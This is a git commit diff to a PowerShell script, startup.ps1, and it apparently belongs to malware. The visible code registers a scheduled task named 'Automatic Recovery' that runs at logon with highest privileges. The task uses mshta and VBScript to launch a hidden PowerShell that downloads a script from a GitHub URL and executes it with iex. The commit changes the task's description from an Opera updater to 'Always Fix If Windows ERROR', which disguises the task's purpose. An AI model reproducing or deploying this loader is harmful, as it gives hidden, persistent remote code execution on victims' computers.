06c230094c4656fa256b3625942bafd3e804e040
43a1723 <hai1723notgay@gmail.com>
2024-06-19 14:00:35 +0700

    Update startup.ps1

--- startup.ps1
+++ startup.ps1
@@ -2,6 +2,6 @@ $skid = "skid"
 $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$skid='$skid';iwr('https://raw.githubusercontent.com/43a1723/test/main/download.ps1')|iex`",0)(window.close)"
 $task_trigger = New-ScheduledTaskTrigger -AtLogOn
 $task_name = "Automatic Recovery"
-$task_desc = "Keeps Opera Browser Assistant up to date"
+$task_desc = "Always Fix If Windows ERROR"
 $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
 Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description $task_desc -RunLevel Highest -Force | Out-Null
